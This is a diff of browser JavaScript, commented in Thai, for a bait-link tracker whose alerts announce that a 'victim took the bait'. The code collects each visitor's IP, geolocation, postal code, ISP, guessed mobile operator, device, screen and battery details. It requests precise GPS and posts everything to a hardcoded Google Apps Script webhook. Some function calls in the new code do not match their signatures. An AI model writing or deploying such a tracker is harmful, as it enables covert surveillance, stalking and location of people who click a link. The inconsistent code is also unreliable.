-      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1).trim() : "ไม่ทราบ"
+      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
     };
   } catch (error) {
     console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
-    // Attempt fallback on any error during ipinfo fetch
-    return getIPFallback();
+    
+    // ลองใช้ API อื่น ๆ เป็น fallback
+    try {
+      // Fallback #1: ipapi.co
+      const apiResponse = await fetch('https://ipapi.co/json/');
+      if (apiResponse.ok) {
+        const apiData = await apiResponse.json();
+        return {
+          ip: apiData.ip || "ไม่สามารถระบุได้",
+          hostname: apiData.hostname || "ไม่มีข้อมูล",
+          city: apiData.city || "ไม่ทราบ",
+          region: apiData.region || apiData.region_name || "ไม่ทราบ",
+          country: apiData.country_code || "ไม่ทราบ",
+          countryName: apiData.country_name || "ไม่ทราบ",
+          loc: apiData.latitude && apiData.longitude ? `${apiData.latitude},${apiData.longitude}` : "ไม่มีข้อมูล",
+          org: apiData.org || "ไม่ทราบ",
+          postal: apiData.postal || "ไม่มีข้อมูล",
+          timezone: apiData.timezone || "ไม่ทราบ",
+          asn: apiData.asn || "ไม่ทราบ",
+          isp: apiData.org || "ไม่ทราบ"
+        };
+      }
+      
+      // Fallback #2: ipify + ipapi.com
+      const basicResponse = await fetch('https://api.ipify.org?format=json');
+      const basicData = await basicResponse.json();
+      const ip = basicData.ip;
+      
+      if (ip) {
+        try {
+          const geoResponse = await fetch(`https://ipapi.com/ip_api.php?ip=${ip}`);
+          const geoData = await geoResponse.json();
+          
+          return {
+            ip: ip,
+            hostname: "ไม่มีข้อมูล",
+            city: geoData.city || "ไม่ทราบ",
+            region: geoData.region_name || "ไม่ทราบ",
+            country: geoData.country_code || "ไม่ทราบ",
+            countryName: geoData.country_name || "ไม่ทราบ",
+            loc: geoData.latitude && geoData.longitude ? `${geoData.latitude},${geoData.longitude}` : "ไม่มีข้อมูล",
+            org: geoData.organisation || geoData.isp || "ไม่ทราบ",
+            postal: geoData.postal || "ไม่มีข้อมูล",
+            timezone: geoData.timezone || "ไม่ทราบ",
+            asn: geoData.asn || "ไม่ทราบ",
+            isp: geoData.isp || "ไม่ทราบ"
+          };
+        } catch (error) {
+          return { ip: ip || "ไม่สามารถระบุได้" };
+        }
+      }
+      
+      return { ip: "ไม่สามารถระบุได้" };
+    } catch (fallbackError) {
+      console.error("ไม่สามารถดึง IP จาก fallback ได้:", fallbackError);
+      return { ip: "ไม่สามารถระบุได้" };
+    }
   }
 }
 
-// Fallback function to get just the IP address using ipify.org
-async function getIPFallback() {
-    try {
-        console.log("Using IP fallback (ipify.org)");
-        const response = await fetch('https://api.ipify.org?format=json');
-        if (!response.ok) {
-            throw new Error(`ipify.org request failed with status ${response.status}`);
-        }
-        const data = await response.json();
-        return { ip: data.ip || "ไม่สามารถระบุได้" }; // Return basic IP info
-    } catch (fallbackError) {
-        console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
-        return { ip: "ไม่สามารถระบุได้" }; // Final fallback value
-    }
+// ฟังก์ชันแปลงรหัสประเทศเป็นชื่อประเทศ
+function getCountryNameFromCode(code) {
+  if (!code) return null;
+  
+  const countries = {
+    "TH": "Thailand", "US": "United States", "GB": "United Kingdom", "JP": "Japan",
+    "CN": "China", "IN": "India", "DE": "Germany", "FR": "France", "IT": "Italy",
+    "CA": "Canada", "AU": "Australia", "KR": "South Korea", "RU": "Russia", "BR": "Brazil",
+    "SG": "Singapore", "MY": "Malaysia", "ID": "Indonesia", "PH": "Philippines", "VN": "Vietnam",
+    "HK": "Hong Kong", "TW": "Taiwan", "NZ": "New Zealand", "SA": "Saudi Arabia", "AE": "United Arab Emirates"
+  };
+  
+  return countries[code.toUpperCase()] || null;
 }
 
-
-// ฟังก์ชันดึงข้อมูล ISP และประเทศจาก IP (ปรับปรุง)
-async function getNetworkProviderInfo() {
-  const networkInfo = {
-    isp: "ไม่สามารถระบุได้",
-    organization: "ไม่สามารถระบุได้",
-    countryCode: "ไม่สามารถระบุได้", // e.g., TH, US
-    countryCallingCode: "ไม่สามารถระบุได้", // e.g., +66, +1
-    remarks: "ข้อมูลเครือข่ายจาก IP Address"
+// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์และข้อมูลเครือข่ายมือถือ
+async function estimatePhoneNumber() {
+  const phoneInfo = {
+    mobileOperator: "ไม่สามารถระบุได้",
+    possibleOperator: "ไม่สามารถระบุได้",
+    countryCode: "ไม่สามารถระบุได้",
+    networkGeneration: "ไม่สามารถระบุได้", // เพิ่มข้อมูลเกี่ยวกับ 3G/4G/5G
+    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
   };
 
   try {
-    const ipDetails = await getIPDetails(); // Use the function that fetches detailed IP info
-
-    networkInfo.isp = ipDetails.isp || "ไม่สามารถระบุได้";
-    networkInfo.organization = ipDetails.org || ipDetails.isp || "ไม่สามารถระบุได้"; // Use org, fallback to ISP
-    networkInfo.countryCode = ipDetails.country || "ไม่สามารถระบุได้"; // TH, US etc.
-
-    // Map country code to calling code (example)
-    const countryCallingCodes = {
-      "TH": "+66", "US": "+1", "GB": "+44", "JP": "+81", "SG": "+65",
-      "VN": "+84", "MY": "+60", "ID": "+62", "PH": "+63", "CN": "+86",
-      // Add more as needed
-    };
-    if (ipDetails.country && countryCallingCodes[ipDetails.country]) {
-      networkInfo.countryCallingCode = countryCallingCodes[ipDetails.country];
-    }
-
-    // Add remarks based on connection type if available
+    // ตรวจสอบข้อมูลการเชื่อมต่อเครือข่าย
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    let connectionTypeRemark = "";
     if (connection) {
-        if (connection.type === 'cellular') connectionTypeRemark = "ผ่านเครือข่ายมือถือ";
-        else if (connection.type === 'wifi') connectionTypeRemark = "ผ่าน WiFi";
-        else if (connection.type !== 'unknown' && connection.type !== 'none') connectionTypeRemark = `ผ่าน ${connection.type}`;
+      // เก็บข้อมูลรุ่นเครือข่าย (2G/3G/4G/5G)
+      if (connection.type === '5g') {
+        phoneInfo.networkGeneration = "5G";
+      } else if (connection.effectiveType === '4g') {
+        phoneInfo.networkGeneration = "4G";
+      } else if (connection.effectiveType === '3g') {
+        phoneInfo.networkGeneration = "3G";
+      } else if (connection.effectiveType === '2g' || connection.effectiveType === 'slow-2g') {
+        phoneInfo.networkGeneration = "2G";
+      }
     }
 
-    if (networkInfo.isp !== "ไม่สามารถระบุได้") {
-        networkInfo.remarks = `${connectionTypeRemark ? connectionTypeRemark + ' ' : ''}(ISP: ${networkInfo.isp})`;
-    } else if (connectionTypeRemark) {
-        networkInfo.remarks = connectionTypeRemark;
+    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
+    const ipDetails = await getIPDetails();
+
+    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก IP data
+    const ispInfo = ipDetails.isp || "";
+    const orgInfo = ipDetails.org || "";
+    const fullIspData = (ispInfo + " " + orgInfo).toLowerCase();
+
+    // เพิ่มเติมข้อมูลประเทศ
+    phoneInfo.countryCode = ipDetails.country || "ไม่สามารถระบุได้";
+    if (ipDetails.countryName) {
+      phoneInfo.countryName = ipDetails.countryName;
     }
 
+    // ปรับปรุงรายชื่อผู้ให้บริการในประเทศไทยให้ครบถ้วน
+    const thaiOperators = {
+      "AIS": ["ais", "advanced info service", "awn", "advanced wireless network", "intouch"],
+      "DTAC": ["dtac", "total access communication", "dtn", "dtac trinet", "telenor", "dtc"],
+      "TRUE": ["true", "true move", "truemove", "true corporation", "trueonline", "real future", "truemoney", "true vision", "tm",],
+      "NT": ["cat", "tot", "national telecom", "nt", "cat telecom", "tot public company limited", "communication authority of thailand"],
+      "3BB": ["triple t broadband", "3bb", "ทริปเปิลที", "triple t internet", "jasmine", "จัสมิน"],
+      "JAS": ["jasmine", "jas", "จัสมิน"],
+      "MYBYCAT": ["my by cat", "my", "mybycat"],
+      "AIT": ["ait", "advanced information technology"],
+      "CS Loxinfo": ["cs loxinfo", "loxinfo", "csloxinfo"],
+      "Inet": ["inet", "internet thailand", "อินเทอร์เน็ตประเทศไทย"],
+      "UIH": ["uih", "united information highway", "อินฟอร์เมชั่นไฮเวย์"],
+      "FiberNow": ["fibernow", "fiber now", "เฟเบอร์นาว"],
+      "SINET": ["sinet", "solution internet service"]
+    };
 
-    return networkInfo;
+    // ค้นหาผู้ให้บริการจากชื่อ ISP
+    let foundOperator = false;
+    for (const [operator, keywords] of Object.entries(thaiOperators)) {
+      if (keywords.some(keyword => fullIspData.includes(keyword.toLowerCase()))) {
+        phoneInfo.possibleOperator = operator;
+        foundOperator = true;
+        break;
+      }
+    }
 
+    // วิเคราะห์ข้อมูลเพิ่มเติมสำหรับผู้ให้บริการโทรศัพท์
+    if (foundOperator) {
+      if (["AIS", "DTAC", "TRUE", "NT"].includes(phoneInfo.possibleOperator)) {
+        phoneInfo.remarks = `อาจใช้เครือข่ายมือถือ ${phoneInfo.possibleOperator} (วิเคราะห์จาก ISP)`;
+      } else {
+        phoneInfo.remarks = `อาจใช้อินเทอร์เน็ตบ้านของ ${phoneInfo.possibleOperator} (วิเคราะห์จาก ISP)`;
+      }
+    }
+
+    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
+    const userAgent = navigator.userAgent.toLowerCase();
+    if (userAgent.includes("android")) {
+      // บนแอนดรอยด์อาจมีข้อมูลเครือข่าย
+      for (const [operator, keywords] of Object.entries(thaiOperators)) {
+        if (keywords.some(keyword => userAgent.includes(keyword.toLowerCase()))) {
+          phoneInfo.mobileOperator = operator;
+          break;
+        }
+      }
+    }
+
+    // ตรวจสอบข้อมูลเพิ่มเติมสำหรับประเทศไทย
+    if (ipDetails.country === "TH" || ipDetails.countryName === "Thailand") {
+      phoneInfo.countryCode = "+66";
+      phoneInfo.countryName = "Thailand";
+      
+      // ถ้าพบข้อมูลพื้นที่ในประเทศไทย
+      if (ipDetails.region && ipDetails.city) {
+        phoneInfo.location = `${ipDetails.city}, ${ipDetails.region}, Thailand`;
+      }
+    }
+
+    // ถ้ามีข้อมูลการเชื่อมต่อแบบมือถือ ให้เพิ่มข้อมูล
+    if (connection && connection.type === 'cellular') {
+      phoneInfo.remarks = `เชื่อมต่อผ่านเครือข่ายมือถือ${phoneInfo.networkGeneration !== "ไม่สามารถระบุได้" ? " " + phoneInfo.networkGeneration : ""} ${phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : ""}`;
+      
+      // หากมีข้อมูลความเร็ว ให้เพิ่มเติม
+      if (connection.downlink) {
+        phoneInfo.networkSpeed = `${connection.downlink} Mbps`;
+        phoneInfo.remarks += ` (ความเร็ว ${connection.downlink} Mbps)`;
+      }
+    }
+
+    return phoneInfo;
   } catch (error) {
-    console.error("ไม่สามารถดึงข้อมูลผู้ให้บริการเครือข่ายได้:", error);
-    return networkInfo; // Return default info on error
+    console.error("ไม่สามารถประมาณการข้อมูลเครือข่ายมือถือได้:", error);
+    return phoneInfo;
   }
 }
 
+// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
+function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        // เมื่อได้รับพิกัด
+        const lat = position.coords.latitude;
+        const long = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const locationData = {
+          lat: lat,
+          long: long,
+          accuracy: accuracy,
+          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
+        };
 
-// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด (ปรับปรุง)
-function createDetailedMessage(ipData, location, timestamp, deviceData, networkProviderInfo, trackingKey, caseName) {
-  // Helper to generate flag emoji from country code
-  const getFlagEmoji = (countryCode) => {
-      if (!countryCode || countryCode.length !== 2) return '🏴';
-      const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
-      return String.fromCodePoint(...codePoints);
-  };
+        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
+        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
+      },
+      function(error) {
+        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
+        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
+      },
+      {
+        timeout: 5000,
+        enableHighAccuracy: true
+      }
+    );
+  }
+}
 
+// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
+function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
+  // ข้อความหลัก
   const message = [
-    "🎣 แจ้งเตือนเหยื่อกินเบ็ด 🎣\n",
-    `⏰ เวลา: ${timestamp}`,
+    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
+    `⏰เวลา: ${timestamp}`,
   ];
-  // Add Case Name if available
+  // เพิ่มข้อมูล Case Name (ถ้ามี)
   if (caseName && caseName !== "ไม่มีค่า") {
-    message.push(`📂 ชื่อเคส: ${caseName}`);
+    message.push(`📂ชื่อเคส: ${caseName}`);
   }
-  // Add Tracking Key if available
+  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
   if (trackingKey && trackingKey !== "ไม่มีค่า") {
-    message.push(`🔑 Tracking Key: ${trackingKey}`);
+    message.push(`🔑Tracking Key: ${trackingKey}`);
   }
-
-  // --- IP Details ---
-  message.push("\n--- 🌐 ข้อมูลเครือข่าย ---");
-  message.push(`IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
+  // --- ข้อมูล IP ละเอียด ---
+  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
   if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
     message.push(`   - Hostname: ${ipData.hostname}`);
   }
-   // Use networkProviderInfo for ISP/Org and Country
-  if (networkProviderInfo) {
-      if (networkProviderInfo.isp && networkProviderInfo.isp !== "ไม่สามารถระบุได้") {
-          message.push(`🏢 ISP: ${networkProviderInfo.isp}`);
-      }
-      // Show Org only if different from ISP and available
-      if (networkProviderInfo.organization && networkProviderInfo.organization !== "ไม่สามารถระบุได้" && networkProviderInfo.organization !== networkProviderInfo.isp) {
-           message.push(`   - องค์กร: ${networkProviderInfo.organization}`);
-      }
-      if (networkProviderInfo.countryCode && networkProviderInfo.countryCode !== "ไม่สามารถระบุได้") {
-          const flag = getFlagEmoji(networkProviderInfo.countryCode);
-          message.push(`📍 ประเทศ (IP): ${flag} ${networkProviderInfo.countryCode} (${networkProviderInfo.countryCallingCode || 'N/A'})`);
-      }
-       if (networkProviderInfo.remarks) {
-          message.push(`📝 หมายเหตุ: ${networkProviderInfo.remarks}`);
-       }
-  }
-  // Location from IP (less accurate)
   if (ipData.city && ipData.country) {
-    message.push(`   - เมือง/ภูมิภาค (IP): ${ipData.city}, ${ipData.region || ipData.country}`);
+    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
+    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
+  }
+  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
+    message.push(`   - พิกัด (IP): ${ipData.loc}`);
+  }
+  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
+    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
+  }
+  if (ipData.org && ipData.org !== "ไม่ทราบ") {
+    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
+  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
+    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
   }
   if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
-    message.push(`   - Timezone (IP): ${ipData.timezone}`);
+    message.push(`   - Timezone: ${ipData.timezone}`);
   }
+  // --- จบข้อมูล IP ---
 
-  // --- GPS Location ---
-  message.push("\n--- 📍 ตำแหน่ง GPS ---");
-  if (location && location !== "ไม่มีข้อมูล" && location !== "ไม่มีข้อมูล (หมดเวลา)" && location !== "ไม่มีข้อมูล (ไม่รองรับ)" && location.lat && location.long) {
-    message.push(`พิกัด: ${location.lat.toFixed(6)}, ${location.long.toFixed(6)}`);
-    message.push(`   - ความแม่นยำ: ±${Math.round(location.accuracy)} เมตร`);
-    message.push(`🗺️ ลิงก์แผนที่: ${location.gmapLink}`);
+  // ข้อมูลพิกัด GPS (ถ้ามี)
+  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
+    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
+    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
   } else {
-    message.push(`สถานะ: ${location || 'ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)'}`);
+    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
   }
 
-  // --- Device Details ---
-  message.push("\n--- 📱 ข้อมูลอุปกรณ์ ---");
-  message.push(`ประเภท: ${deviceData.deviceType}`);
-  message.push(`รุ่น: ${deviceData.deviceModel}`);
-  message.push(`ผู้ผลิต: ${deviceData.vendor}`);
-  message.push(`ระบบปฏิบัติการ: ${deviceData.platform}`);
-  message.push(`เบราว์เซอร์: ${deviceData.browser}`);
-  message.push(`ภาษา: ${deviceData.language}`);
+  // ข้อมูลอุปกรณ์
+  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
+  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);
 
-  // --- Screen Details ---
-  message.push("\n--- 📊 ข้อมูลหน้าจอ ---");
-  message.push(`ขนาด: ${deviceData.screenSize}`);
-  message.push(`   - ความลึกสี: ${deviceData.screenColorDepth} bit`);
-  message.push(`   - Pixel Ratio: x${deviceData.devicePixelRatio}`);
+  // ข้อมูลหน้าจอ
+  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);
 
-  // --- Connection Details ---
-  if (typeof deviceData.connection === 'object' && deviceData.connection.networkType !== 'ไม่สามารถระบุได้') {
-      message.push("\n--- 📶 ข้อมูลการเชื่อมต่อ ---");
-      const networkTypeIcon = deviceData.connection.isWifi ? "📶" : (deviceData.connection.isMobile ? "📱" : "🔌");
-      const networkType = deviceData.connection.networkType || "ไม่ทราบประเภท";
-      message.push(`${networkTypeIcon} ประเภท: ${networkType} (Effective: ${deviceData.connection.effectiveType || 'N/A'})`);
-      if (deviceData.connection.downlink !== 'ไม่สามารถระบุได้') {
-          message.push(`   - Downlink: ${deviceData.connection.downlink} Mbps`);
+  // ข้อมูลระบบ
+  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
+  message.push(`🔤ภาษา: ${deviceData.language}`);
+
+  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
+  if (typeof deviceData.connection === 'object') {
+    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
+    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
+    const networkType = deviceData.connection.networkType;
+    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
+    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);
+
+    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
+    if (deviceData.connection.isMobile && phoneInfo) {
+      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
+      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
+        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
       }
-      if (deviceData.connection.rtt !== 'ไม่สามารถระบุได้') {
-          message.push(`   - RTT: ${deviceData.connection.rtt} ms`);
-      }
-      message.push(`   - Save Data Mode: ${deviceData.connection.saveData ? 'เปิด' : 'ปิด'}`);
+      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
+    }
   }
 
-  // --- Battery Details ---
+  // ข้อมูลแบตเตอรี่
   if (typeof deviceData.battery === 'object') {
-    message.push("\n--- 🔋 ข้อมูลแบตเตอรี่ ---");
-    message.push(`ระดับ: ${deviceData.battery.level}`);
-    message.push(`สถานะ: ${deviceData.battery.charging}`);
-  } else if (deviceData.battery !== "ไม่รองรับ") {
-     message.push("\n--- 🔋 ข้อมูลแบตเตอรี่ ---");
-     message.push(`สถานะ: ${deviceData.battery}`); // Show "ไม่สามารถเข้าถึงได้" or other string status
+    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
   }
-
-  // --- Other ---
-  // message.push(`\nUser Agent: ${deviceData.userAgent}`); // Uncomment for debugging if needed
 
   return message.join("\n");
 }
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  // !! IMPORTANT: Replace with your actual Google Apps Script Webhook URL !!
   const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';
 
-  // Use sessionStorage to prevent resending the same data within the same session
-  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
-  const currentRequestId = dataToSend.requestId; // Use the generated ID
-
-  if (sentRequests.includes(currentRequestId)) {
-    console.log("ข้อมูลนี้เคยส่งแล้วใน Session นี้ (requestId: " + currentRequestId + ")");
-    return; // Stop execution if already sent
+  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
+  if (!dataToSend.requestId) {
+    dataToSend.requestId = generateUniqueId();
   }
+  
+  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
+  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
+  if (sentRequests.includes(dataToSend.requestId)) {
+    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
+    return;
+  }
+  
+  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
 
-  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + currentRequestId + ")");
-  console.log("Data to send:", dataToSend); // Log the data being sent
-
-  // Create the message string using the updated function
-  const message = createDetailedMessage(
-      dataToSend.ip,
-      dataToSend.location,
-      dataToSend.timestamp,
-      dataToSend.deviceInfo,
-      dataToSend.networkProviderInfo, // Pass networkProviderInfo
-      dataToSend.trackingKey,
-      dataToSend.caseName
-  );
-
-  // Prepare payload for Google Apps Script
-  const payload = {
-      message: message, // Send the formatted message string
-      // Include raw data if your Apps Script needs it
-      rawData: dataToSend
-  };
-
-
-  // Send data using Fetch API
+  // ส่งข้อมูล
   fetch(webhookUrl, {
     method: 'POST',
-    // mode: 'no-cors', // 'no-cors' prevents reading the response, which might hide errors. Use 'cors' if your script is configured for it.
     headers: {
-      // 'Content-Type': 'application/x-www-form-urlencoded', // Use this if your script expects form data
-       'Content-Type': 'text/plain;charset=utf-8', // Use text/plain if your script uses e.postData.contents
-      // 'Content-Type': 'application/json', // Use this if your script parses JSON directly (less common for simple doGet/doPost)
+      'Content-Type': 'application/json'
     },
-    // body: new URLSearchParams({ message: message }) // For application/x-www-form-urlencoded
-     body: JSON.stringify(payload) // Send the whole payload as a JSON string for text/plain or application/json
+    body: JSON.stringify(dataToSend),
+    mode: 'no-cors'
   })
-  .then(response => {
-      // Check response status even with no-cors (basic check)
-      if (response && response.ok) { // response might be opaque with no-cors
-          console.log("ส่งข้อมูลไปยัง Server สำเร็จ (อาจจะไม่ได้รับ Response)");
-          // Record that this request ID has been sent successfully in this session
-          sentRequests.push(currentRequestId);
-          sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-      } else if (response) {
-          console.warn(`ส่งข้อมูลไปยัง Server อาจมีปัญหา Status: ${response.status}`);
-          // Optionally try reading response text if not no-cors
-          // return response.text().then(text => console.error("Server Response:", text));
-      } else {
-           console.log("ส่งข้อมูลไปยัง Server สำเร็จ (No-CORS, ไม่สามารถตรวจสอบ Response ได้)");
-           sentRequests.push(currentRequestId);
-           sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-      }
+  .then(() => {
+    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
+    
+    // บันทึก requestId ที่ส่งสำเร็จแล้ว
+    sentRequests.push(dataToSend.requestId);
+    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
-    // Consider implementing a retry mechanism or alternative notification here
   });
+}
+
+// สร้าง unique ID สำหรับแต่ละการร้องขอ
+function generateUniqueId() {
+  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
 }
